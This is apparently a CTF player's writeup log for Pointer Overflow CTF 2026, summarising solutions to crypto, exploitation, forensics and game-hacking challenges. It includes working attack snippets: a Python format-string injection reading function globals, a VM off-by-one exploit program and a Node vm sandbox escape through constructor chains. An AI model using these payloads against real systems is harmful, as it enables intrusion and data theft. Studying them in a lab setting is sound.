# Pointer Overflow CTF 2026 — Writeups

Solutions and notes for the challenges I've worked.

Flags are per-team, so the ones below only unlock against my own session —
they're here to show the work, not to share an answer. Methods are the point.
Full public writeups belong *after* the event; treat this as a working log until then.

---

## Solved

| # | Challenge | Category | Pts | Technique | Flag / Token |
|---|-----------|----------|-----|-----------|--------------|
| 1 | Letters Never Sent | Crypto | 95 | Beaufort cipher, key hidden in letter's starred border | `redacted` |
| 2 | Forty Measures Deep | Crypto | 100 | MIDI pitches → 40-symbol alphabet | `redacted` |
| 3 | The Apparatus, Rapport | Crypto | 125 | Tic-tac-toe move order → Beaufort key | `redacted` |
| 4 | The Notary's Seal | Crypto | 135 | RSA e=3, unpadded short message → cube root | `redacted` |
| 5 | A Map of Small Things | Crypto | 137 | Supersingular curve, smooth order → Pohlig–Hellman | `redacted` |
| 6 | Noise Below the Signal | Crypto | 141 | Low-noise small-secret LWE → lattice (Kannan + LLL) | `redacted` |
| 7 | Read Me My Fortune | Exploitation | 104 | Python `str.format` injection | `redacted` |
| 8 | Thirty-Two Steps Down | Exploitation | 128 | Sandbox VM off-by-one on level check | `redacted` |
| 9 | The Interpreter's Margin | Exploitation | 141 | Node `vm` escape via host object's constructor | `redacted` |
| 10 | Archaeology of Mistakes | Forensics | 100 | Carve JPEGs from disk image, read EXIF | `redacted` |
| 11 | A Quiet Home | Forensics | 137 | Rogue MQTT device serial in broker log + pcap | `redacted` |
| 12 | The Apparatus, Ectograph | Forensics | 141 | Unregistered device id in Threshold SQLite | `redacted` |
| 13 | The House Always Misses | Game Hacking | 100 | Run Godot game in Docker, scanmem the win check | `redacted` |
| 14 | Terms and Conditions Apply | Game Hacking | 141 | Replay HMAC event protocol → signed-int32 HP overflow | `redacted` |
| 15 | Frequency and Consequence | Misc | 121 | Slow FSK in noise; Goertzel per-slot tone decode | `redacted` |
| 16 | [The Cipher in the Stars](writeups/16-the-cipher-in-the-stars.md) | Crypto | 141 | SARG04 sift + parity (bit-flip) decode | `redacted` |
| 17 | [The Sandglass](writeups/17-the-sandglass.md) | Exploitation | 98 | SafeLua: whole `io` table copied → `io.open` | `redacted` |
| 18 | [What the Heap Remembers](writeups/18-what-the-heap-remembers.md) | Exploitation | 100 | Slab leaks stale keystream; regen offline | `redacted` |
| 19 | [A Few Seconds Either Way](writeups/19-a-few-seconds-either-way.md) | Exploitation | 133 | TOCTOU: check name, swap target in 150ms gap | `redacted` |
| 20 | [The Apparatus, Manifestation](writeups/20-the-apparatus-manifestation.md) | Exploitation | 145 | Unbounded `amend` heap overflow → fn ptr | `redacted` |
| 21 | [A Cabin Worth](writeups/21-a-cabin-worth.md) | Forensics | 119 | Joplin pre-checkpoint WAL + AES-GCM (pet-name key) | `redacted` |
| 22 | [What Goes Unwritten](writeups/22-what-goes-unwritten.md) | Forensics | 120 | Minidump; two base32 halves rejoined | `redacted` ⚠️ unconfirmed |
| 23 | [The Accused](writeups/23-the-accused.md) | Forensics | 141 | Correlate 3 artifacts → session + operator (one-shot) | `redacted` (operator: Marion Halberd) |
| 24 | [Leap of Faith](writeups/24-leap-of-faith.md) | Game Hacking | 87 | Godot PCK; win check client-side; replay mint API | `redacted` |
| 25 | [Client-Side Truth](writeups/25-client-side-truth.md) | Game Hacking | 141 | Server trusts client-reported position + hits | `redacted` |
| 26 | [The Apparatus, Invocation](writeups/26-the-apparatus-invocation.md) | Misc | 101 | 7×7 Lights Out solved over GF(2) | `redacted` |

Rows 1–15 are detailed inline below; rows 16–26 (this session) link to files in
[`writeups/`](writeups/).

## In progress / parked

| Challenge | Category | Pts | Status |
|-----------|----------|-----|--------|
| The Consulting Room | Crypto | 125 | CBC padding-oracle attack scripted; run parked before completion |

---

## Crypto

### 1. Letters Never Sent

A recovered letter plus a ciphertext `QXGNC{...}`.

Flags start `POCTF{REDACTED}`. Decode straight through.

> When every note is the same length and volume, the music *is* the message.

### 3. The Apparatus, Rapport

A tic-tac-toe board, a ciphertext, and a known plaintext (`POCTF`).

X wins only on the right column (C-F-I). Recovering the key from `POCTF` gives a
Beaufort-style shift over printable ASCII; the first shifts spell out squares
`F E C A H …`. Replaying the game legally (X first, game ends the instant X
completes the line) forces the full move order **`FECAHGDBI`**. Both the primary
flag and a secondary message ("*By salt and by ash…*") fall out clean.

> The known plaintext tells you the cipher; the game's rules tell you the key.

### 4. The Notary's Seal

RSA with `e = 3`, seal = `m³ mod n`.

The seal is far smaller than `n`, so `m³` never wrapped — it's a plain integer
cube. Exact integer cube root recovers `m`, which is ASCII.

```python
# iroot via binary search; m = iroot(c, 3); bytes.fromhex ... -> flag
```

> Tiny exponent + no padding + short message = arithmetic, not cryptography.

### 5. A Map of Small Things

ECDLP on `y² = x³ + x` over a 64-bit prime with `p ≡ 3 (mod 4)`.

That curve is **supersingular**: order is exactly `p + 1`. Here
`p+1 = 2² · 121123 · 38603 · 949584469` — fully smooth. Pohlig–Hellman splits the
log into one BSGS per prime factor, then CRT. Recovered `k` verifies `kG = Q`.

> A curve chosen without checking its order is a lock with the key filed off.

### 6. Noise Below the Signal

LWE: `n=15`, `q=1601`, 30 samples, error bound `B=3`, secret also in `{-3..3}`.

Both defects matter: tiny noise *and* a tiny secret make the vector `(s, e)`
unusually short. A Kannan embedding of the samples puts that vector far below the
lattice's generic minimum, so LLL pulls the secret out directly. (Had to hand-roll
a fast LLL — no numpy/sage on the box.)

> Keep the secret and the noise wide, or the lattice hands them back.

---

## Exploitation

### 7. Read Me My Fortune

The service runs `template.format(name=…, elara=_greet)` on your input.

`elara` is bound to a *function*, and every function exposes `__globals__`. The
flag is a module global, so:

```
{elara.__globals__[FLAG]}
```

> Never let user text be the format string.

### 8. Thirty-Two Steps Down

A stack VM. `CALL` refuses `level >= 32`, so you can climb to level 32.
`READ_HOST_FLAG` was meant to require kernel level 33 but checks `level < 32` —
the "legacy carve-out." The one level you can reach is the one that unlocks it.

A self-recursive subroutine descends to level 32, then reads the flag:

```
main:  PUSH 1
       CALL rec
       HALT
rec:   DUP
       PUSH 32
       SUB
       JZ atkernel
       PUSH 1
       ADD
       CALL rec
       RET
atkernel:
       READ_HOST_FLAG
       RET
```

> Two guards that enforce the same boundary must use the same number.

### 9. The Interpreter's Margin

A Node `vm` sandbox exposing only `console`, `Math`, `JSON` — but `Math` and
`JSON` are the **host's** objects. Their prototype chain leads back to the host
realm:

```js
const F = Math.constructor.constructor;    // host Function
const att = F('return _attendant')();      // runs in host scope
att.verify_identity('<redacted>');   // token = _SEED.slice(0,16), in source
att.retrieve();                            // returns the flag
```

Per-team artifact, so this runs fully offline.

> Don't hand live host built-ins to a sandbox. Use `isolated-vm`.

---

## Forensics

### 10. Archaeology of Mistakes

A 40 MB raw image; a partially-overwritten JPEG. Carve all JPEGs by scanning for
`FF D8 FF`. Eight decoys, one real photo — the only one dated **06/05**. Its EXIF
`UserComment` holds the token. The middle data blocks were clobbered, but EXIF
lives in the header and survived.

> "Not what it shows" means read the metadata, not the pixels.

### 11. A Quiet Home

Home Assistant backup + Mosquitto log + pcap. A client `zwave_c4pf5` connects from
`192.168.1.47` (not the HA host) only during the intrusion window and publishes
once to `zwave/rf_key_c4pf5/attributes`. The log truncates the payload; the pcap
has it whole:

```json
{"node_id": 47, "product_serial": "<redacted>",
 "manufacturer": "Aeotec", "model": "MiniMote Key Fob (ZW088)"}
```

The device "they were carrying" announced its own serial.

> A device that joins only during the crime, and broadcasts, signs the crime.

### 12. The Apparatus, Ectograph

Threshold messenger data directory (SQLite + attachments + config). Elena has
three real devices; a fourth, `<redacted>` ("Elena's MacBook"), is
registered mid-intrusion from a public IP, with a MacBook **Air** fingerprint
(she owns a Pro). It sent exactly the three cover-story messages after she went
silent, and nothing else.

```sql
SELECT sender_device_id, count(*) FROM messages
WHERE sender_id='u_elena' GROUP BY sender_device_id;
```

> The forgery is the device that exists only to send the lie.

---

## Game Hacking

### 13. The House Always Misses

A Godot 4.7 shooting gallery. Your shots never land — the hitbox geometry lies.
No macOS build, and it's an interactive game, so:

1. **Ran the Linux binary in Docker** (Intel Mac → native, no emulation), with
   Xvfb + software OpenGL (llvmpipe), driven by `xdotool` + `import` screenshots.
2. The real client **authenticated to the server** on its own — the piece raw
   `curl` couldn't reproduce (CSRF). Running the actual game sidesteps that.
3. Extracted + decompressed the embedded PCK to confirm the server flow
   (`/instance` → `/tick` → `/complete` → `marker`). The client signs its own
   progress, so an edited game is a trusted game.
4. With `scanmem`, found the `Target: 1200` score threshold (int64) and set every
   copy to **0**. The win check is `score >= target` each frame → `0 >= 0` → win.
   The game called `/complete` and printed the per-team flag.

> When the client signs its own score, editing the client is the exploit — and the
> rules said so out loud.

### 14. Terms and Conditions Apply

Replay the Godot client's HMAC-signed event protocol → heal the boss past
`INT32_MAX` → signed-int32 HP wraps negative = dead. Full writeup:
[`writeups/14-terms-and-conditions.md`](writeups/14-terms-and-conditions.md).

---

## Misc

### 15. Frequency and Consequence

Slow FSK buried in noise; Goertzel per-500ms-slot tone detection, aligned by
detection confidence. Full writeup:
[`writeups/15-frequency-and-consequence.md`](writeups/15-frequency-and-consequence.md).
Reusable decoder: [`tools/fsk_decode.py`](tools/fsk_decode.py).

---

## Tooling notes

- Self-contained Python for the crypto (cube root, Pohlig–Hellman, LLL) — no sage.
- `scratchpad/v` venv for `numpy` / `Pillow` / `zstandard` when the box lacked them.
- Godot PCK (format 4, Godot 4.7): directory at the tail, `PACK_REL_FILEBASE`
  flag, per-file zstd-compressed token buffers.
- Docker image: Ubuntu 22.04 + Mesa software GL + Xvfb + xdotool + scanmem, run
  with `--cap-add=SYS_PTRACE --security-opt seccomp=unconfined`.
